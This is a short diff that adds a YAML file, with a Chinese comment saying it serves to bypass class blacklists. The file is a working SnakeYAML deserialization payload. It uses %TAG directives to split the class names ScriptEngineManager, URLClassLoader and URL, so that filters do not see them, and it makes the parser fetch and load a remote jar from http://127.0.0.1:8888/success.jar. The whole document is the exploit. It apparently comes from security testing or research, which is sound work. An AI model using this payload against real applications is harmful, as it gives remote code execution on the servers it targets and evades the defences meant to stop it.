@@ -1,0 +1,10 @@
+# 用于绕过类黑名单
+%TAG !a! tag:yaml.org,2002:javax.script.ScriptEng
+%TAG !b! tag:yaml.org,2002:java.net.URLClassL
+%TAG !c! tag:yaml.org,2002:java.net.U
+---
+!a!ineManager [
+  !b!oader [[
+    !c!RL ["http://127.0.0.1:8888/success.jar"]
+  ]]
+]
